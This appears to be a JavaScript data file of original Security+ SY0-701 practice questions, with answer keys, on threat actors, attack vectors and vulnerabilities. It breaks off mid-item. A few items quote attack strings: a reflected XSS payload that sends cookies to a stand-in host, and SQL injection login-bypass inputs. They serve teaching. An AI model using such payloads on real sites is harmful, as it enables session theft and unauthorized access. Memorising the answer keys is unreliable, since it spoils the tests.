// Built-in question set: Domain 2.0, objectives 2.1–2.3 (threat actors & motivations,
// threat vectors & attack surfaces, vulnerabilities). Scenario-based, exam-style questions
// with PBQs. Same schema as the upload format; all content is original.
export const DOMAIN2_21_23_SET = {
  "setName": "Domain 2.0 — 2.1–2.3 exam-style set",
  "examVersion": "SY0-701",
  "description": "Original scenario-based questions for objectives 2.1 (threat actors & motivations), 2.2 (threat vectors & attack surfaces) and 2.3 (vulnerabilities). Mix of multiple choice, select-TWO and PBQs (matching, ordering, fill-in-the-blank, hotspot, simulation). Written against the SY0-701 objectives and Professor Messer's Domain 2 material.",
  "questions": [
    {
      "id": "d2-2.1-01",
      "domain": "2.1",
      "type": "single",
      "difficulty": "hard",
      "question": "A regional water utility discovers that attackers have had access to its SCADA network for 14 months. They used custom-built malware, rotated command-and-control servers across several countries, and quietly copied engineering drawings of treatment plants. No ransom demand or public statement was ever made. Which of the following threat actors is MOST likely responsible?",
      "options": [
        "Unskilled attacker",
        "Nation-state",
        "Organized crime",
        "Hacktivist"
      ],
      "answer": [
        1
      ],
      "explanation": "Long dwell time, custom tooling, multi-country infrastructure and interest in critical-infrastructure designs with no monetization point to a well-funded, highly sophisticated nation-state (APT). Organized crime would monetize (ransom, sale), a hacktivist would seek publicity, and an unskilled attacker lacks the capability to build custom malware."
    },
    {
      "id": "d2-2.1-02",
      "domain": "2.1",
      "type": "single",
      "difficulty": "medium",
      "question": "A pharmaceutical company's public website is defaced with a message condemning animal testing, and a batch of internal emails about lab procedures is sent to several journalists the same day. Which of the following BEST describes the threat actor and motivation?",
      "options": [
        "Organized crime; financial gain",
        "Insider threat; revenge",
        "Nation-state; espionage",
        "Hacktivist; philosophical/political beliefs"
      ],
      "answer": [
        3
      ],
      "explanation": "Defacement plus leaking documents to the press to promote a cause is classic hacktivism driven by philosophical or political beliefs. Nothing was monetized (not organized crime), the data was published rather than kept secret (not espionage), and there is no sign of an employee with a grudge."
    },
    {
      "id": "d2-2.1-03",
      "domain": "2.1",
      "type": "single",
      "difficulty": "medium",
      "question": "The marketing department signs up for a cloud file-sharing service with a corporate credit card and uploads customer contact lists to it. The IT department was never consulted, and the service has no MFA or backups configured. Which of the following threat actors does this represent?",
      "options": [
        "Unskilled attacker",
        "Shadow IT",
        "Hacktivist",
        "Insider threat"
      ],
      "answer": [
        1
      ],
      "explanation": "Shadow IT is a group that builds or buys its own technology outside IT's control. It is a threat actor even without malicious intent: the risk comes from missing security, backups and change control. An insider threat implies deliberate misuse of access, which is not described here."
    },
    {
      "id": "d2-2.1-04",
      "domain": "2.1",
      "type": "multiple",
      "difficulty": "medium",
      "question": "A security analyst is comparing an unskilled attacker with an organized crime group. Which of the following attributes MOST clearly describe the unskilled attacker? (Select TWO)",
      "options": [
        "High level of sophistication and custom exploit development",
        "Limited resources and funding",
        "Primarily motivated by war",
        "Relies on publicly available scripts and tools they cannot modify",
        "Corporate-like structure with specialized roles"
      ],
      "answer": [
        1,
        3
      ],
      "explanation": "Unskilled attackers have little money or infrastructure and run ready-made scripts without understanding them. Specialized roles, custom exploit development and high sophistication describe organized crime (or nation-states); war is a nation-state motivation."
    },
    {
      "id": "d2-2.1-05",
      "domain": "2.1",
      "type": "multiple",
      "difficulty": "medium",
      "question": "A criminal group encrypts a hospital's servers, then contacts the hospital through a negotiation portal: it demands cryptocurrency for the decryption key and threatens to publish stolen patient records if payment is not made within 72 hours. Which of the following motivations are MOST evident? (Select TWO)",
      "options": [
        "Espionage",
        "War",
        "Financial gain",
        "Philosophical/political beliefs",
        "Blackmail"
      ],
      "answer": [
        2,
        4
      ],
      "explanation": "The group wants money (financial gain) and uses the threat of publishing stolen data as leverage (blackmail) — the double-extortion model. Espionage would keep the data secret, and nothing suggests a political cause or armed conflict."
    },
    {
      "id": "d2-2.1-06",
      "domain": "2.1",
      "type": "single",
      "difficulty": "easy",
      "question": "A system administrator who was passed over for promotion submits his resignation. On his last evening he deletes the backup jobs and the backup archives for the servers he managed. Which of the following is the MOST likely motivation?",
      "options": [
        "Revenge",
        "Espionage",
        "Financial gain",
        "Ethical"
      ],
      "answer": [
        0
      ],
      "explanation": "A personal grievance followed by destructive action against the employer points to revenge, a typical insider-threat motivation. He gained nothing financially and did not steal information."
    },
    {
      "id": "d2-2.1-07",
      "domain": "2.1",
      "type": "single",
      "difficulty": "hard",
      "question": "A manufacturer hires an outside group to obtain a competitor's unreleased product designs so it can bring a similar product to market first. Which of the following BEST describes the manufacturer's motivation?",
      "options": [
        "Disruption/chaos",
        "Espionage",
        "Data exfiltration",
        "Service disruption"
      ],
      "answer": [
        1
      ],
      "explanation": "Gaining a competitor's secrets for advantage is espionage. Data exfiltration is the method used to get the designs out, but the question asks why the manufacturer wants them. Nothing was disrupted, so the two disruption options do not fit."
    },
    {
      "id": "d2-2.1-08",
      "domain": "2.1",
      "type": "single",
      "difficulty": "easy",
      "question": "A security researcher finds a remote code execution flaw in a popular router, reports it privately to the vendor and agrees to wait 90 days before publishing details so a patch can be released. Which of the following motivations does this represent?",
      "options": [
        "Blackmail",
        "Financial gain",
        "Ethical",
        "Philosophical/political beliefs"
      ],
      "answer": [
        2
      ],
      "explanation": "Responsible disclosure to get a vulnerability fixed is an ethical motivation. Blackmail would demand something in exchange for silence; there is no cause being promoted and no payment demanded."
    },
    {
      "id": "d2-2.1-09",
      "domain": "2.1",
      "type": "single",
      "difficulty": "hard",
      "question": "During an armed conflict between two countries, destructive malware wipes the control systems of one country's power grid within hours of a ground offensive. Which of the following BEST describes the attacker's motivation?",
      "options": [
        "Disruption/chaos",
        "War",
        "Service disruption",
        "Philosophical/political beliefs"
      ],
      "answer": [
        1
      ],
      "explanation": "The attack is coordinated with military action as part of an armed conflict, so the motivation is war. Service disruption is the effect, but the deciding clue in the scenario is the military context, which only fits a nation-state at war."
    },
    {
      "id": "d2-2.1-10",
      "domain": "2.1",
      "type": "single",
      "difficulty": "medium",
      "question": "An insider threat typically has only moderate technical sophistication, yet is often one of the hardest actors to stop. Which of the following attributes BEST explains this?",
      "options": [
        "Large external resources and funding",
        "Being internal: existing access and knowledge of where data lives and how controls work",
        "Custom-developed exploit kits",
        "Ability to launch distributed denial-of-service attacks"
      ],
      "answer": [
        1
      ],
      "explanation": "The insider's advantage is being internal: legitimate access plus knowledge of the organization's data and security controls. Funding, custom exploits and DDoS capability describe external, well-resourced actors."
    },
    {
      "id": "d2-2.1-11",
      "domain": "2.1",
      "type": "single",
      "difficulty": "medium",
      "question": "A student uses a downloaded booter (DDoS-for-hire) tool against the school's learning platform during exam week. When the school places the platform behind a content delivery network, the attack stops working and the student cannot adjust the tool. Which of the following threat actors BEST fits?",
      "options": [
        "Hacktivist",
        "Organized crime",
        "Unskilled attacker",
        "Nation-state"
      ],
      "answer": [
        2
      ],
      "explanation": "Running a ready-made tool and being unable to adapt it when it fails is the defining trait of an unskilled attacker. There is no cause, no profit motive and no sophistication."
    },
    {
      "id": "d2-2.1-12",
      "domain": "2.1",
      "type": "matching",
      "difficulty": "medium",
      "question": "Match each scenario to the threat actor it BEST describes. Not every actor is used.",
      "prompts": [
        "A group with affiliates and a negotiation portal extorts hospitals",
        "A department runs its own cloud CRM without IT's knowledge",
        "A contractor with VPN access copies source code before the contract ends",
        "A government-funded team keeps access to a defense ministry for years",
        "A group defaces an oil company's website to protest drilling"
      ],
      "targets": [
        "Nation-state",
        "Unskilled attacker",
        "Hacktivist",
        "Insider threat",
        "Organized crime",
        "Shadow IT"
      ],
      "answer": [
        4,
        5,
        3,
        0,
        2
      ],
      "explanation": "Profit-driven structured group = organized crime; unapproved IT = shadow IT; anyone with legitimate inside access (including contractors) misusing it = insider threat; long-term government-funded access = nation-state; protest-driven defacement = hacktivist. Unskilled attacker is a distractor."
    },
    {
      "id": "d2-2.1-13",
      "domain": "2.1",
      "type": "matching",
      "difficulty": "medium",
      "question": "Match each scenario to the attacker's PRIMARY motivation. Not every motivation is used.",
      "prompts": [
        "A fired employee wipes the file server he used to administer",
        "A researcher privately reports a flaw so the vendor can fix it",
        "Attackers threaten to leak stolen patient records unless paid",
        "A foreign intelligence service steals trade-negotiation documents"
      ],
      "targets": [
        "Revenge",
        "Ethical",
        "Blackmail",
        "Espionage",
        "War",
        "Financial gain"
      ],
      "answer": [
        0,
        1,
        2,
        3
      ],
      "explanation": "Grievance-driven destruction = revenge; responsible disclosure = ethical; 'pay or we publish' = blackmail; obtaining another government's secrets = espionage. War and financial gain are distractors."
    },
    {
      "id": "d2-2.2-01",
      "domain": "2.2",
      "type": "single",
      "difficulty": "hard",
      "question": "An accounts payable clerk receives an email from a long-standing supplier's real email address, inside an existing invoice thread, asking that next month's payment go to a new bank account. Investigation shows the supplier's mailbox had been compromised. Which of the following BEST describes this attack?",
      "options": [
        "Typosquatting",
        "Brand impersonation",
        "Watering hole",
        "Business email compromise"
      ],
      "answer": [
        3
      ],
      "explanation": "Using a compromised legitimate business mailbox to redirect payments is business email compromise. The sender domain is genuine, so it is not typosquatting; no third-party website was poisoned (watering hole); and there are no fake sites trading on a brand."
    },
    {
      "id": "d2-2.2-02",
      "domain": "2.2",
      "type": "single",
      "difficulty": "hard",
      "question": "Engineers at a defense contractor are well trained and rarely click links in email. Attackers compromise an industry forum the engineers visit daily and serve malicious JavaScript only to visitors from the contractor's IP address range. Which of the following attacks is this?",
      "options": [
        "Pretexting",
        "Spear phishing",
        "Watering hole",
        "Typosquatting"
      ],
      "answer": [
        2
      ],
      "explanation": "A watering hole attack compromises a third-party site the target is known to visit and waits for them, often filtering by IP so only the target is infected. Spear phishing would send a targeted message, typosquatting relies on a look-alike domain, and pretexting is a made-up story."
    },
    {
      "id": "d2-2.2-03",
      "domain": "2.2",
      "type": "single",
      "difficulty": "medium",
      "question": "Searches for a popular antivirus product return hundreds of sites that use the vendor's name and logo and offer a \"free lifetime license\" download that installs adware. The domains are unrelated to the vendor's name. Which of the following BEST describes this technique?",
      "options": [
        "Typosquatting",
        "Brand impersonation",
        "Watering hole",
        "Business email compromise"
      ],
      "answer": [
        1
      ],
      "explanation": "Many fake sites trading on a known brand and surfacing through search results is brand impersonation. Typosquatting would require domains that are misspellings of the real one; the scenario says the domains are unrelated."
    },
    {
      "id": "d2-2.2-04",
      "domain": "2.2",
      "type": "multiple",
      "difficulty": "medium",
      "question": "A new branch office audit lists the following findings. Which of the following are examples of the unsecure networks threat vector? (Select TWO)",
      "options": [
        "A printer still using the manufacturer's default admin password",
        "A lobby kiosk with Bluetooth left discoverable and unpaired",
        "A spreadsheet with macros emailed from an unknown sender",
        "A Windows 7 PC that no longer receives security updates",
        "A guest Wi-Fi network bridged directly into the corporate LAN"
      ],
      "answer": [
        1,
        4
      ],
      "explanation": "Unsecure networks covers wireless, wired and Bluetooth exposure, so the bridged guest Wi-Fi and the discoverable Bluetooth kiosk fit. The printer is the default credentials vector, the Windows 7 PC is unsupported systems, and the macro spreadsheet is a file-/message-based vector."
    },
    {
      "id": "d2-2.2-05",
      "domain": "2.2",
      "type": "single",
      "difficulty": "medium",
      "question": "The help desk receives an urgent call from someone claiming to be the CFO travelling abroad. The caller says he is locked out before a board meeting and demands that his password be reset and the new one read out over the phone. Which of the following controls would BEST mitigate this threat?",
      "options": [
        "Deploy an email security gateway",
        "Lower the account lockout threshold",
        "Verify identity by calling back on the number in the HR directory before any reset",
        "Increase the minimum password length"
      ],
      "answer": [
        2
      ],
      "explanation": "This is vishing using impersonation and an urgent pretext. Independent verification through a known, trusted number defeats it regardless of how convincing the caller is. Password length, email filtering and lockout settings do nothing against a voice-based social engineering request."
    },
    {
      "id": "d2-2.2-06",
      "domain": "2.2",
      "type": "single",
      "difficulty": "hard",
      "question": "Company A gives 3,000 laptops an installed VPN client. Company B provides remote access only through a clientless, browser-based portal. A critical vulnerability is published that affects both products. From an attack surface perspective, which of the following statements is MOST accurate?",
      "options": [
        "Company A must patch every endpoint individually, while Company B's exposure is concentrated on the central portal server",
        "Company A is safer because each client is isolated from the others",
        "Company B is not affected because agentless software cannot be exploited",
        "Both companies have identical exposure because the vulnerability is the same"
      ],
      "answer": [
        0
      ],
      "explanation": "Client-based software spreads the vulnerable code across every endpoint, each of which must be patched. Agentless access concentrates it on the server: one place to patch, but a compromise of that server can affect every user who connects. Agentless software is still exploitable."
    },
    {
      "id": "d2-2.2-07",
      "domain": "2.2",
      "type": "single",
      "difficulty": "medium",
      "question": "A coordinated network of newly created accounts posts fabricated claims that a regional bank is insolvent, boosts the posts with likes and shares, and triggers a wave of withdrawals. Which of the following BEST describes this activity?",
      "options": [
        "Disinformation",
        "Brand impersonation",
        "Pretexting",
        "Misinformation"
      ],
      "answer": [
        0
      ],
      "explanation": "Deliberately fabricated, coordinated false content is disinformation. Misinformation is false information spread without necessarily intending to deceive. The bank's brand was not impersonated, and no one was drawn into a story to reveal information."
    },
    {
      "id": "d2-2.2-08",
      "domain": "2.2",
      "type": "single",
      "difficulty": "easy",
      "question": "Employees receive emails linking to rnicrosoft-support.com, a domain registered by an attacker to harvest credentials. Which of the following techniques does the domain itself represent?",
      "options": [
        "Watering hole",
        "Business email compromise",
        "Typosquatting",
        "Smishing"
      ],
      "answer": [
        2
      ],
      "explanation": "Registering a domain that looks like a legitimate one ('rn' imitating 'm') is typosquatting (URL hijacking). The delivery method is phishing email, not SMS, and no third-party site or business mailbox was compromised."
    },
    {
      "id": "d2-2.2-09",
      "domain": "2.2",
      "type": "ordering",
      "difficulty": "medium",
      "question": "Arrange the stages of a social media influence (misinformation/disinformation) campaign in the order they typically occur.",
      "items": [
        "Create multiple fake user accounts",
        "Post the fabricated content from one fake account",
        "Amplify it with likes and shares from the other fake accounts",
        "The platform's algorithm promotes the post to real users",
        "Real users share it with their own contacts",
        "Mass media reports on the now-popular story"
      ],
      "explanation": "The attacker builds fake accounts, seeds the content, amplifies it artificially, lets the algorithm pick it up, and real users and finally the media spread it further, which gives the false story credibility."
    },
    {
      "id": "d2-2.2-10",
      "domain": "2.2",
      "type": "hotspot",
      "difficulty": "medium",
      "question": "An industrial plant's OT network is air-gapped: it has no network connection to the corporate LAN or the internet. Click the point that is the MOST likely vector for malware to reach the OT network.",
      "zones": [
        {
          "id": "z_fw",
          "label": "Internet edge firewall",
          "x": 2,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_mail",
          "label": "Email security gateway",
          "x": 26.5,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_usb",
          "label": "USB port on OT engineering workstation",
          "x": 51,
          "y": 30,
          "w": 22.5,
          "h": 40
        },
        {
          "id": "z_wifi",
          "label": "Corporate guest Wi-Fi",
          "x": 75.5,
          "y": 30,
          "w": 22.5,
          "h": 40
        }
      ],
      "answer": [
        "z_usb"
      ],
      "explanation": "An air gap removes every network path, so network-borne vectors (internet, email, Wi-Fi) cannot reach the OT network directly. Removable devices carried across the gap are the classic way in (and an easy way to carry data out)."
    },
    {
      "id": "d2-2.2-11",
      "domain": "2.2",
      "type": "matching",
      "difficulty": "medium",
      "question": "Match each scenario to the threat vector it represents. Not every vector is used.",
      "prompts": [
        "An SVG image in a chat message runs JavaScript when previewed",
        "A spreadsheet macro downloads a payload when enabled",
        "A USB stick that acts as a keyboard types PowerShell commands",
        "Attackers reach clients through their IT outsourcer's remote-management tool",
        "A new IP camera is accessed with admin/admin"
      ],
      "targets": [
        "Image-based",
        "File-based",
        "Removable device",
        "Supply chain",
        "Default credentials",
        "Voice call",
        "Unsecure networks"
      ],
      "answer": [
        0,
        1,
        2,
        3,
        4
      ],
      "explanation": "SVG is XML that can carry script (image-based); macros live in documents (file-based); a HID-emulating USB stick is a removable device; a compromised MSP is a supply chain vector; factory logins are default credentials."
    },
    {
      "id": "d2-2.2-12",
      "domain": "2.2",
      "type": "single",
      "difficulty": "hard",
      "question": "A network scan finds a Windows XP PC under a desk in the facilities office. It runs the building's HVAC controller software, is not in the asset inventory, and the vendor no longer supports either the OS or the software. Which of the following should the security team do FIRST?",
      "options": [
        "Remove the HVAC software and reinstall it",
        "Apply the latest Windows XP security patches",
        "Add it to the asset inventory and isolate it on a restricted network segment",
        "Ignore it because it is not internet-facing"
      ],
      "answer": [
        2
      ],
      "explanation": "An unsupported system cannot be patched, so the first step is to know it exists (inventory) and contain the risk with segmentation and restrictive access. There are no new XP patches to apply, reinstalling the same software changes nothing, and internal systems are still reachable by malware already inside the network."
    },
    {
      "id": "d2-2.2-13",
      "domain": "2.2",
      "type": "simulation",
      "difficulty": "hard",
      "question": "A new public web server is about to go live. Configure it to minimize its attack surface while keeping the website and secure remote administration available.",
      "rows": [
        {
          "label": "TCP 443 (HTTPS) inbound from the internet",
          "fieldType": "select",
          "options": [
            "Allow",
            "Deny"
          ],
          "answer": "Allow"
        },
        {
          "label": "TCP 23 (Telnet) inbound from the internet",
          "fieldType": "select",
          "options": [
            "Allow",
            "Deny"
          ],
          "answer": "Deny"
        },
        {
          "label": "TCP 3389 (RDP) inbound from the internet",
          "fieldType": "select",
          "options": [
            "Allow",
            "Deny"
          ],
          "answer": "Deny"
        },
        {
          "label": "TCP 22 (SSH) inbound from the management subnet only",
          "fieldType": "select",
          "options": [
            "Allow",
            "Deny"
          ],
          "answer": "Allow"
        },
        {
          "label": "Change the vendor's default admin password before go-live",
          "fieldType": "checkbox",
          "answer": true
        },
        {
          "label": "Keep the vendor's sample/test application installed for troubleshooting",
          "fieldType": "checkbox",
          "answer": false
        }
      ],
      "explanation": "Only the service the public needs (HTTPS) is exposed. Telnet is cleartext and RDP should never face the internet. Administration uses encrypted SSH restricted to the management subnet. Default credentials are changed, and unnecessary sample software is removed because every open port and extra application adds attack surface."
    },
    {
      "id": "d2-2.2-14",
      "domain": "2.2",
      "type": "single",
      "difficulty": "easy",
      "question": "A user receives a phone call that shows the bank's real phone number on caller ID. The caller says there is a fraudulent transaction and asks the user to read back the one-time code that was just sent by SMS. Which of the following BEST describes this attack?",
      "options": [
        "Smishing",
        "Watering hole",
        "Vishing",
        "Typosquatting"
      ],
      "answer": [
        2
      ],
      "explanation": "The social engineering happens over a voice call with a spoofed caller ID, which is vishing. The SMS only carries the legitimate one-time code the attacker wants; the attack itself is not delivered by SMS, so it is not smishing."
    },
    {
      "id": "d2-2.2-15",
      "domain": "2.2",
      "type": "single",
      "difficulty": "medium",
      "question": "Several employees receive text messages that appear to come from the CEO's mobile number: \"In a meeting, need 5 gift cards for a client urgently, send me the codes.\" Which of the following BEST describes this attack?",
      "options": [
        "Business email compromise",
        "Smishing",
        "Watering hole",
        "Vishing"
      ],
      "answer": [
        1
      ],
      "explanation": "Phishing delivered by SMS is smishing; here it is combined with impersonation of the CEO. There is no voice call (vishing) and no email account involved (BEC)."
    },
    {
      "id": "d2-2.3-01",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "A privileged service checks that a user owns /tmp/report.txt and then, a few milliseconds later, opens that path and writes to it. An attacker replaces the file with a symbolic link to /etc/shadow between the check and the write. Which of the following vulnerabilities is being exploited?",
      "options": [
        "Buffer overflow",
        "Memory injection",
        "Directory traversal",
        "Race condition (time-of-check to time-of-use)"
      ],
      "answer": [
        3
      ],
      "explanation": "The value checked (file ownership) changes before it is used (the write). That window between time-of-check and time-of-use is a race condition. No memory is overwritten and no ../ path manipulation is used."
    },
    {
      "id": "d2-2.3-02",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "EDR alerts that explorer.exe has loaded a library from C:\\Users\\Public\\upd.dll. No new process was created, and the malicious code now runs with explorer.exe's permissions, hidden from tools that list running processes. Which of the following BEST describes this?",
      "options": [
        "Race condition",
        "Buffer overflow",
        "Malicious update",
        "Memory injection (DLL injection)"
      ],
      "answer": [
        3
      ],
      "explanation": "Malware placed inside an existing process's memory via a planted DLL is memory injection. It hides behind a legitimate process and inherits its rights. A buffer overflow overwrites adjacent memory with oversized input, which is not described here."
    },
    {
      "id": "d2-2.3-03",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A web server log shows the following request to the login page, followed by a successful login as the first user in the database:\n\nPOST /login  username=admin' OR '1'='1' --  password=x\n\nWhich of the following vulnerabilities does this indicate?",
      "options": [
        "SQL injection",
        "Cross-site scripting",
        "Cross-site request forgery",
        "Directory traversal"
      ],
      "answer": [
        0
      ],
      "explanation": "The quote, the always-true condition '1'='1' and the comment marker -- alter the database query and bypass authentication: classic SQL injection. XSS would inject script for a browser, directory traversal would use ../, and CSRF abuses an already-authenticated browser."
    },
    {
      "id": "d2-2.3-04",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "Users report that a link in a phishing email sent them to the company's legitimate search page. The proxy log shows:\n\nGET /search?q=<script>new Image().src='https://x.example/c?'+document.cookie</script>\n\nThe script was not stored on the server. Which of the following BEST describes this vulnerability?",
      "options": [
        "Cross-site request forgery",
        "SQL injection",
        "Stored (persistent) cross-site scripting",
        "Reflected (non-persistent) cross-site scripting"
      ],
      "answer": [
        3
      ],
      "explanation": "The script arrives in the link, is reflected back by the vulnerable search page and runs in each victim's browser, sending their cookie to the attacker. Because it was not saved on the server, it is reflected rather than stored XSS. CSRF would make the browser send a request, not run attacker script."
    },
    {
      "id": "d2-2.3-05",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "An attacker posts a product review containing a script. Every customer who later opens that product page has their session cookie sent to the attacker. Which of the following vulnerabilities is this?",
      "options": [
        "SQL injection",
        "Race condition",
        "Reflected (non-persistent) cross-site scripting",
        "Stored (persistent) cross-site scripting"
      ],
      "answer": [
        3
      ],
      "explanation": "The payload is saved on the site and executes for every visitor, which is stored (persistent) XSS. Reflected XSS requires each victim to click a crafted link."
    },
    {
      "id": "d2-2.3-06",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A vendor of internet-connected thermostats was told about a critical vulnerability but released the first fix a year later. Customers had no way to patch the devices themselves in the meantime. Which of the following BEST explains why this class of vulnerability tends to persist?",
      "options": [
        "Firmware cannot contain vulnerabilities",
        "The device firmware can usually be updated only by the manufacturer",
        "Thermostats run no operating system",
        "Customers forget to run Patch Tuesday updates"
      ],
      "answer": [
        1
      ],
      "explanation": "Embedded and IoT devices run firmware that only the manufacturer can patch, and manufacturers may be slow to do so. The devices do run an operating system, Patch Tuesday applies to Microsoft products, and firmware can certainly be vulnerable."
    },
    {
      "id": "d2-2.3-07",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A vendor announces that a switch model will no longer be sold after next quarter, but it will continue to receive security updates for three more years. Which of the following BEST describes the switch's status?",
      "options": [
        "Legacy and unpatchable",
        "End-of-life (EOL)",
        "Zero-day",
        "End of service life (EOSL)"
      ],
      "answer": [
        1
      ],
      "explanation": "EOL means the product is no longer sold; support and patches may continue for a while. EOSL is the point where security patches stop, which is the date that actually creates the vulnerability."
    },
    {
      "id": "d2-2.3-08",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "In a multi-tenant cloud, a tenant's VM reads memory pages that the hypervisor recently reallocated from another customer's VM and finds fragments of that customer's data. The attacker never left their own VM. Which of the following vulnerabilities BEST describes this?",
      "options": [
        "VM escape",
        "Buffer overflow",
        "Race condition",
        "Resource reuse"
      ],
      "answer": [
        3
      ],
      "explanation": "Data leaking between VMs through shared or reallocated resources is resource reuse. A VM escape requires breaking out of the guest to the hypervisor or other VMs, which the scenario rules out."
    },
    {
      "id": "d2-2.3-09",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A researcher exploits a browser bug inside a guest VM, then a flaw in the hypervisor's virtual hardware emulation, and gains control of another VM running on the same host. Which of the following vulnerabilities was ultimately exploited?",
      "options": [
        "Resource reuse",
        "Side loading",
        "VM escape",
        "Memory injection"
      ],
      "answer": [
        2
      ],
      "explanation": "Breaking out of one virtual machine to reach the hypervisor or other VMs on the same host is a VM escape. The impact is severe because one hypervisor may host many VMs."
    },
    {
      "id": "d2-2.3-10",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "A widely used IT management product delivers an update through its built-in update process. The update is digitally signed by the vendor, but it contains a backdoor that attackers inserted into the vendor's build system months earlier. Which of the following BEST describes this vulnerability?",
      "options": [
        "Zero-day in the customers' operating systems",
        "Software supply chain compromise delivered as a malicious update",
        "Typosquatting of the vendor's download site",
        "Misconfiguration of the customers' firewalls"
      ],
      "answer": [
        1
      ],
      "explanation": "The malicious code was inserted at the software provider and shipped through a trusted, signed update channel (as in SolarWinds Orion). A valid signature proves who built the update, not that it is clean. The customers' systems and configurations were not the weak point."
    },
    {
      "id": "d2-2.3-11",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A company bought discounted network switches from an unknown online reseller. The switches carry a well-known vendor's logo but fail every firmware update. Which of the following would have BEST reduced this risk?",
      "options": [
        "Enabling automatic firmware updates",
        "Changing the switches' default passwords",
        "Purchasing only from the vendor or its authorized resellers",
        "Placing the switches in a DMZ"
      ],
      "answer": [
        2
      ],
      "explanation": "Counterfeit hardware is a hardware-provider supply chain risk. Buying from a short list of trusted, authorized sources prevents it. Automatic updates already fail on these devices, and passwords or network placement don't make untrusted hardware trustworthy."
    },
    {
      "id": "d2-2.3-12",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "A third-party contractor stores 14 million customer records in a cloud storage bucket that anyone on the internet can list and download, with no password. Which of the following is the ROOT CAUSE vulnerability?",
      "options": [
        "Zero-day",
        "Buffer overflow",
        "Misconfiguration",
        "Race condition"
      ],
      "answer": [
        2
      ],
      "explanation": "The storage service worked as designed; it was set to public access. Open permissions are a misconfiguration vulnerability. No unknown software flaw (zero-day) or memory bug was involved."
    },
    {
      "id": "d2-2.3-13",
      "domain": "2.3",
      "type": "single",
      "difficulty": "easy",
      "question": "An employee installs a game on a corporate Android phone from a third-party APK website because it is not in the company's approved app store. The phone has not been rooted. Which of the following BEST describes this?",
      "options": [
        "Rooting",
        "Side loading",
        "VM escape",
        "Jailbreaking"
      ],
      "answer": [
        1
      ],
      "explanation": "Installing apps from outside the approved store is side loading. Rooting (Android) and jailbreaking (iOS) replace or modify the OS itself, which the scenario says did not happen."
    },
    {
      "id": "d2-2.3-14",
      "domain": "2.3",
      "type": "single",
      "difficulty": "hard",
      "question": "Attackers are actively exploiting a newly discovered vulnerability in a VPN appliance. The vendor has not released a patch, and antivirus vendors have no signature yet. Which of the following is the BEST way to reduce risk until a patch is available?",
      "options": [
        "Update antivirus signatures",
        "Apply the latest vendor patch",
        "Layered controls: restrict access to the appliance, monitor for anomalous behavior and apply vendor mitigations",
        "Wait for the CVE entry to be published"
      ],
      "answer": [
        2
      ],
      "explanation": "This is a zero-day: no patch and no signature exist yet, so patching and signature updates cannot help. Defense in depth (reducing exposure, behavior-based monitoring, temporary vendor workarounds) is what remains."
    },
    {
      "id": "d2-2.3-15",
      "domain": "2.3",
      "type": "single",
      "difficulty": "medium",
      "question": "An audit finds that an internal application stores user passwords as unsalted MD5 hashes and accepts TLS 1.0 connections with deprecated cipher suites. Which of the following categories BEST describes these findings?",
      "options": [
        "Cryptographic vulnerabilities",
        "Race conditions",
        "Virtualization vulnerabilities",
        "Supply chain vulnerabilities"
      ],
      "answer": [
        0
      ],
      "explanation": "Weak or deprecated algorithms (MD5, TLS 1.0, old ciphers) and missing salts are cryptographic vulnerabilities. MD5 has known collisions and unsalted hashes are easy to crack."
    },
    {
      "id": "d2-2.3-16",
      "domain": "2.3",
      "type": "multiple",
      "difficulty": "medium",
      "question": "A business-critical application runs on a server whose operating system reached end of service life. It cannot be replaced for another 18 months. Which of the following are the BEST compensating controls? (Select TWO)",
      "options": [
        "Place the server on an isolated network segment with strict firewall rules",
        "Add IPS signatures that target known exploits for the old OS",
        "Grant all users local administrator rights to speed up support",
        "Enable automatic OS updates",
        "Install the vendor's latest security patches"
      ],
      "answer": [
        0,
        1
      ],
      "explanation": "After EOSL no patches are released, so automatic updates or new patches are not available. Risk is reduced around the system instead: segmentation and tight firewall rules limit who can reach it, and IPS signatures block known exploits. Granting admin rights increases risk."
    },
    {
      "id": "d2-2.3-17",
      "domain": "2.3",
      "type": "matching",
      "difficulty": "medium",
      "question": "Match each scenario to the vulnerability it describes. Not every vulnerability is used.",
      "prompts": [
        "Two simultaneous withdrawals both pass the same balance check",
        "600 characters of input overwrite adjacent memory past a 512-byte buffer",
        "' OR 1=1 -- in a login form returns every user",
        "A posted comment runs script in every reader's browser",
        "Code in a guest VM gains control of the hypervisor and other tenants",
        "An app is installed from a third-party APK site, bypassing the store"
      ],
      "targets": [
        "Race condition",
        "Buffer overflow",
        "SQL injection",
        "Cross-site scripting",
        "VM escape",
        "Side loading",
        "Memory injection",
        "Jailbreaking"
      ],
      "answer": [
        0,
        1,
        2,
        3,
        4,
        5
      ],
      "explanation": "Check-then-use timing = race condition; oversized input overwriting memory = buffer overflow; SQL syntax in input = SQL injection; script stored on a page = (stored) XSS; breaking out of a guest = VM escape; installing outside the store = side loading. Memory injection and jailbreaking are distractors."
    },
    {
      "id": "d2-2.3-18",
      "domain": "2.3",
      "type": "fill_blank",
      "difficulty": "medium",
      "question": "A race condition in which a value changes between the moment it is validated and the moment it is used is abbreviated ____.",
      "blanks": [
        {
          "accepted": [
            "TOCTOU",
            "TOCTTOU",
            "TOC/TOU",
            "TOC-TOU",
            "time-of-check to time-of-use",
            "time of check to time of use",
            "time-of-check time-of-use"
          ]
        }
      ],
      "explanation": "TOCTOU = time-of-check to time-of-use. The window between the check (TOC) and the use (TOU) is what the attacker races."
    },
    {
      "id": "d2-2.3-19",
      "domain": "2.3",
      "type": "hotspot",
      "difficulty": "hard",
      "question": "An attacker enters a SQL injection payload into the search box of a three-tier web application. Click the component where the injected code is ultimately EXECUTED.",
      "zones": [
        {
